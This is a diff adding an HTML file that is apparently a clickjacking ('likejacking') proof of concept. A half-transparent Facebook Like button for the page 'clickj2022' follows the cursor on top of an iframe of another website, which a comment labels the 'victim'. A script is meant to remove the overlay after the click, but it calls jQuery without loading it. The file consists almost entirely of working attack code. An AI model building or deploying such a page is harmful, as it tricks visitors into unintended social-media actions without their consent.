@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<style>
+    body {
+        width: 100%;
+        height: 2000px;
+    }
+
+    * {
+        margin: 0;
+        box-sizing: border-box;
+    }
+
+    iframe {
+        position: relative;
+        width: 100%;
+        height: 100%;
+    }
+
+    #hiden-overplay {
+        z-index: 9999;
+        position: fixed;
+        opacity: 0.5 !important;
+        /* height: 20px; */
+        /* height: 100%; */
+    }
+</style>
+
+<body>
+    <div id="hiden-overplay">
+        <div id="fb-root"></div>
+        <script async defer crossorigin="anonymous"
+            src="https://connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v13.0" nonce="ar65CFkp"></script>
+        <div class="fb-like" data-href="https://www.facebook.com/clickj2022" data-width="" data-layout="button_count"
+            data-action="like" data-size="small" data-share="false"></div>
+    </div>
+
+
+    <!-- Let's put a victim to here -->
+    <iframe src="http://testing.justinthemorning.com" frameborder="0"></iframe>
+
+    <script type="text/javascript">
+        window.onmousemove = function(e) {
+            var m = document.getElementById("hiden-overplay")
+            m.style.left = e.clientX - 20 + 'px'
+            m.style.top = e.clientY - 10 + 'px'
+        }
+
+        // Disappear after click
+        var inIframe = false;
+
+        function checkClick() {
+            if (document.activeElement && document.activeElement === document.getElementById("hiden-overplay")) {
+                if (inIframe == false) {
+                    $('#hiden-overplay').remove();
+                    inIframe = true;
+                }
+            } else {
+                inIframe = false;
+            }
+        }
+        setInterval(checkClick, 1000);
+    </script>
+</body>
+
+</html>
